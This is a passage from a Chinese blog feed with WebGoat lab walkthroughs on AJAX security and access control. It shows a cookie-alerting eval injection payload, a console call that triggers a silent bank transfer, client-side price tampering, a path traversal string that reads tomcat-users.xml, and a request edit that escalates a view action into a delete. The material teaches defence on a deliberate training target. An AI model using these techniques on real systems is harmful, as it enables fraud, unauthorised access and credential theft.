&lt;h2 id=&quot;Slient-Transactions-Attacks&quot;&gt;&lt;a href=&quot;#Slient-Transactions-Attacks&quot; class=&quot;headerlink&quot; title=&quot;Slient Transactions Attacks&quot;&gt;&lt;/a&gt;Slient Transactions Attacks&lt;/h2&gt;&lt;p&gt;静默交易攻击。&lt;/p&gt;
&lt;p&gt;进去之后看到：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/24.png&quot; alt=&quot;24&quot;&gt;&lt;br&gt;这是一个银行转账的页面，上面显示了我的金额，目标账户和转账额度，当点击“Confirm”后，我的金额就转出去了，会减少相应的数值。&lt;br&gt;通过查看页面源代码，可以看到如下重要代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;processData&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; accountNo = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;newAccount&#39;&lt;/span&gt;).value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; amount = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;amount&#39;&lt;/span&gt;).value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( accountNo == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		alert(&lt;span class=&quot;string&quot;&gt;&#39;Please enter a valid account number to transfer to.&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( amount == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		alert(&lt;span class=&quot;string&quot;&gt;&#39;Please enter a valid amount to transfer.&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; balanceValue = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;balanceID&#39;&lt;/span&gt;).innerHTML;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	balanceValue = balanceValue.replace( &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;RegExp&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;$&#39;&lt;/span&gt;) , &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( &lt;span class=&quot;built_in&quot;&gt;parseFloat&lt;/span&gt;(amount) &amp;gt; &lt;span class=&quot;built_in&quot;&gt;parseFloat&lt;/span&gt;(balanceValue) ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		alert(&lt;span class=&quot;string&quot;&gt;&#39;You can not transfer more funds than what is available in your balance.&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;).value  = &lt;span class=&quot;string&quot;&gt;&#39;Transferring&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	submitData(accountNo, amount);&lt;span class=&quot;comment&quot;&gt;//转账&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; 	&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;).value  = &lt;span class=&quot;string&quot;&gt;&#39;Confirm&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	balanceValue = &lt;span class=&quot;built_in&quot;&gt;parseFloat&lt;/span&gt;(balanceValue) - &lt;span class=&quot;built_in&quot;&gt;parseFloat&lt;/span&gt;(amount);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	balanceValue = balanceValue.toFixed(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;balanceID&#39;&lt;/span&gt;).innerHTML = balanceValue + &lt;span class=&quot;string&quot;&gt;&#39;$&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;submitData&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;accountNo, balance&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; url = &lt;span class=&quot;string&quot;&gt;&#39;attack?Screen=40&amp;amp;menu=400&amp;amp;from=ajax&amp;amp;newAccount=&#39;&lt;/span&gt;+ accountNo+ &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;amount=&#39;&lt;/span&gt; + balance +&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;confirm=&#39;&lt;/span&gt; + &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;confirm&#39;&lt;/span&gt;).value; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;typeof&lt;/span&gt; XMLHttpRequest != &lt;span class=&quot;string&quot;&gt;&#39;undefined&#39;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.ActiveXObject) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		req = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ActiveXObject(&lt;span class=&quot;string&quot;&gt;&#39;Microsoft.XMLHTTP&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	req.open(&lt;span class=&quot;string&quot;&gt;&#39;GET&#39;&lt;/span&gt;, url, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	req.onreadystatechange = callback;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   	req.send(&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;callback&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.readyState == &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (req.status == &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; result =  req.responseText ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; resultsDiv = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.getElementById(&lt;span class=&quot;string&quot;&gt;&#39;resultsDiv&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			resultsDiv.innerHTML = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			resultsDiv.innerHTML = result;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;有两个关键函数，一个是processData(),一个是submitData()。&lt;br&gt;当用户输入账户名和额度后，点击“Confirm”，在转账交易前，会首先调用processData()来判断用户的输入以及转账额度是否合理等，然后调用函数submitData(accountNo, amount)进行转账，而该函数实际上是向后台提交转账所需的重要信息：目标账号和转账金额。&lt;br&gt;如果通过浏览器直接执行submitData(accountNo，balance)函数，那么就可以绕过客户端验证，不需要任何额外的确认和用户数字签名。这里指的是用浏览器直接执行，而不是系统给定的“Confirm”按钮。在浏览器地址栏输入如下内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;javascript:submitData(1,1)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;转账成功：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/25.png&quot; alt=&quot;25&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Dangerous-Use-of-Eval&quot;&gt;&lt;a href=&quot;#Dangerous-Use-of-Eval&quot; class=&quot;headerlink&quot; title=&quot;Dangerous Use of Eval&quot;&gt;&lt;/a&gt;Dangerous Use of Eval&lt;/h2&gt;&lt;p&gt;危险指令使用。eval()函数可以编译并执行任何JS代码。这隐藏了一个潜在的安全问题。进入之后看到如下页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/26.png&quot; alt=&quot;26&quot;&gt;&lt;br&gt;这是一个购物的网页，要求通过alert()函数显示出document.cookie，3位数的授权码会进入服务器进行验证，因此可以针对该授权码进行特别构造。&lt;br&gt;输入如下内容：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;123’);alert(document.cookie);(‘&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;则服务器收到并返回的JavaScript结果是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;eval(‘123’);&lt;br&gt;  alert(document.cookie);&lt;br&gt;  (‘’);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Insecure-Client-Storage&quot;&gt;&lt;a href=&quot;#Insecure-Client-Storage&quot; class=&quot;headerlink&quot; title=&quot;Insecure Client Storage&quot;&gt;&lt;/a&gt;Insecure Client Storage&lt;/h2&gt;&lt;p&gt;不安全的客户端存储。在服务器端验证所有的用户输入信息是很好的，但是在客户端输入的任何验证信息都存在被逆向分析的脆弱性。记住，客户端的任何数据都不能被视为机密！&lt;/p&gt;
&lt;h3 id=&quot;Stage-1-2&quot;&gt;&lt;a href=&quot;#Stage-1-2&quot; class=&quot;headerlink&quot; title=&quot;Stage 1&quot;&gt;&lt;/a&gt;Stage 1&lt;/h3&gt;&lt;p&gt;进去之后，显示页面是这样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_ajax_security/27.png&quot; alt=&quot;27&quot;&gt;&lt;/p&gt;
&lt;p&gt;要求我们发现意外的购物优惠码。这就要求我们跟踪购物优惠码的执行过程，按F12打开firebug进行JS的调试。点击进入“脚本”，然后设置断点，在对应输入框里面随便输入某一个值，脚本自动运行到断点处停下来。如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_ajax_security/28.png&quot; alt=&quot;28&quot;&gt;&lt;br&gt;此时查看变量decrypted的值为：PLATINUM&lt;/p&gt;
&lt;p&gt;这就是我们发现的优惠码。&lt;/p&gt;
&lt;h3 id=&quot;Stage-2-2&quot;&gt;&lt;a href=&quot;#Stage-2-2&quot; class=&quot;headerlink&quot; title=&quot;Stage 2&quot;&gt;&lt;/a&gt;Stage 2&lt;/h3&gt;&lt;p&gt;要求我们绕过客户端的验证，提交订单却不花钱。这个需要在客户端修改价格，利用firebug，在HTML中找到readonly=””,删除该属性，则可在页面上随意修改商品价格，然后提交免费的订单！&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;这一节主要是Ajax安全，有很多内容，在客户端修改，拦截服务器的响应修改等，非常实用，并且拓宽了自己的知识面。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/04/26/Webgoat之AJAX_Security/&quot;&gt;http://qimingyu.github.io/2016/04/26/Webgoat之AJAX_Security/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;DOM-Based-cross-site-scripting&quot;&gt;&lt;a href=&quot;#DOM-Based-cross-site-scripting&quot; class=&quot;headerlink&quot; title=&quot;DOM-Based cross-site scripting&quot;&gt;&lt;/a&gt;DOM-Based cross-site scripting&lt;/h2&gt;&lt;p&gt;基于DOM的跨站点脚本。DOM是文档对象模型，它是中立于平台和语言的接口，它允许程序和脚本动态地访问和更新文档的内容、结构和样式。W3C DOM标准被分为3个不同的部分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;核心DOM-针对任何结构化文档的标准模型&lt;/li&gt;
&lt;li&gt;XML DOM-针对XML文档的标准模型&lt;/li&gt;
&lt;li&gt;HTML DOM-针对HTML文档的标准模型（HTML DOM是关于如何获取、修改、添加或HTML元素的标准）&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="AJAX" scheme="http://qimingyu.github.io/tags/AJAX/"/>
    
  </entry>
  
  <entry>
    <title>WebGoat之Access Control</title>
    <link href="http://qimingyu.github.io/2016/04/25/Webgoat%E4%B9%8BAccess_Control/"/>
    <id>http://qimingyu.github.io/2016/04/25/Webgoat之Access_Control/</id>
    <published>2016-04-25T02:03:10.000Z</published>
    <updated>2016-05-19T09:52:02.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Using-an-Access-Control-Matrix&quot;&gt;&lt;a href=&quot;#Using-an-Access-Control-Matrix&quot; class=&quot;headerlink&quot; title=&quot;Using an Access Control Matrix&quot;&gt;&lt;/a&gt;Using an Access Control Matrix&lt;/h2&gt;&lt;p&gt;RBAC（Role Based Access Control）模型，基于角色的访问控制模型有三个原则：最小权限原则、责任分离原则和数据抽象原则。不同的人对不同的资源有不同的访问权限。这一步的作用是用来熟悉该站点所使用的访问控制规则，以下是该实验中的不同角色权限：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如下图，表示成功：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;这里插一段话，既然提到了基于角色的访问控制，那就要明白水平权限和垂直权限的意思。之前都学到了这里，却没有继续深入水平权限与垂直权限，在百度二面的时候，问到这个居然是完全懵逼的状态。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;基于角色的访问控制按角色权限高低可分为两类：垂直权限控制和水平权限控制。&lt;br&gt;  垂直权限控制作用在两类不同权限的角色之间，例如A是普通用户，B是管理员用户，那么B就拥有更多的可访问资源，这些资源包括某个URL下的资源、系统中的某个接口调用等。对于垂直权限控制，各编程平台都会有一些框架可以利用，因为垂直权限控制易于抽象，与具体业务耦合较少。Java Web开发程序员可以利用Spring Security，通过一些配置即可完成系统中的垂直权限控制需求(可基于URL和基于Method)。&lt;br&gt;  水平权限控制是作用与相同的角色之间的。例如A、B都是社交网站的用户，他们对该网站上的资源拥有同样的权限，但是各自又都有一些私有数据，类似私信列表、好友列表。因为构造一个获取其他用户私有页面的URL(REST风格，很好构造)是很简单的，所以A用户可能只要改下URL中的ID等信息就能得到B用户的URL，这个环节不做权限控制显然不合理，而这里又很容易被疏忽掉。试想动辄上百个接口或URL，对每个都要做这样的水平权限判断，漏掉任何一个都会造成潜在漏洞。此外，这类漏洞自动化工具还不好扫描，不易察觉。因为水平权限控制判断的依据已经是数据级别的，所以一般框架较难处理这类情况，程序架构好点的可以通过拦截器对同类接口参数进行过滤和判断。否则，也只能具体接口具体判断了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Bypass-a-Path-Based-Access-Control-Scheme&quot;&gt;&lt;a href=&quot;#Bypass-a-Path-Based-Access-Control-Scheme&quot; class=&quot;headerlink&quot; title=&quot;Bypass a Path Based Access Control Scheme&quot;&gt;&lt;/a&gt;Bypass a Path Based Access Control Scheme&lt;/h2&gt;&lt;p&gt;绕过路径访问控制。&lt;br&gt;这个任务就是要读取我们一般不能读的文件，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;一般就是从左边选择一个文件，然后点击“View File”，在页面最下面会给出文件内容，重点在于它给出了我们读取文件的目录位置：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;F:\WebGoat-OWASP_Standard-5.2\WebGoat-5.2\tomcat\webapps\WebGoat\lesson_plan\ConcurrencyCart.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而我们的目标文件位置为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tomcat\conf\tomcat-users.xml&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是说要从上面的位置读到下面的位置，采用相对路径去读取。&lt;/p&gt;
&lt;p&gt;通过打开burpsuite，拦截浏览器发送给服务器端的数据，并修改，再传送，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;可以看到File那一栏的参数是可以修改的。&lt;br&gt;修改为如下值：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;../../../conf/tomcat-users.xml&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_access_control/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;成功之后可以看到，读取的是tomcat的一份很重要的配置文件。&lt;/p&gt;
&lt;h2 id=&quot;Role-Based-Access-Control&quot;&gt;&lt;a href=&quot;#Role-Based-Access-Control&quot; class=&quot;headerlink&quot; title=&quot;Role Based Access Control&quot;&gt;&lt;/a&gt;Role Based Access Control&lt;/h2&gt;&lt;p&gt;关于基于角色的访问控制，具体实验过程分为如下四步：&lt;/p&gt;
&lt;h3 id=&quot;Bypass-Business-Layer-Access-Control&quot;&gt;&lt;a href=&quot;#Bypass-Business-Layer-Access-Control&quot; class=&quot;headerlink&quot; title=&quot;Bypass Business Layer Access Control&quot;&gt;&lt;/a&gt;Bypass Business Layer Access Control&lt;/h3&gt;&lt;p&gt;这一步要求我们绕过业务层访问控制。它给出了很多人的用户名和密码，可以用他们的用户名和密码登陆系统，但是每个人在该系统中的权限不一样，因此能够进行的操作也不一样。其中HR是能够删除任意员工的简介的，首先用HR的账号登陆之后，删除一个员工的简介，用burpsuit抓取提交的post参数，得到如下结果：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后登陆一个普通用户的账户，他只有查看和搜索用户的权限，在其查看用户的时候，截取其提交数据，与前面比较，如下所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_access_control/6.png&quot; alt=&quot;6&quot;&gt;&lt;br&gt;修改提交的参数的值，将“ViewProfile”改为“DeleteProfile”，执行成功:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_access_control/7.png&quot; alt=&quot;7&quot;&gt;&lt;/p&gt;
&lt;p&gt;这个之所以能够进行越权操作的根本原因在于，网站把用户权限的校验放在了前台，用户一旦登陆进去之后的操作，就没有再进行验证了。导致用户可以越权操作。&lt;/p&gt;
&lt;h3 id=&quot;Add-Business-Layer-Access-Control&quot;&gt;&lt;a href=&quot;#Add-Business-Layer-Access-Control&quot; class=&quot;headerlink&quot; title=&quot;Add Business Layer Access Control&quot;&gt;&lt;/a&gt;Add Business Layer Access Control&lt;/h3&gt;&lt;p&gt;这一步要求我们在原始代码中增加一个业务访问控制层。关于这里相对应的代码在RoleBasedAccessControl.java文件中，相应路径为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;F:\WebGoat-OWASP_Standard-5.2\WebGoat-5.2\tomcat\webapps\WebGoat\JavaSource\org\owasp\webgoat\lessons\RoleBasedAccessControl\RoleBasedAccessControl.java&lt;/p&gt;
&lt;/blockquote&gt;
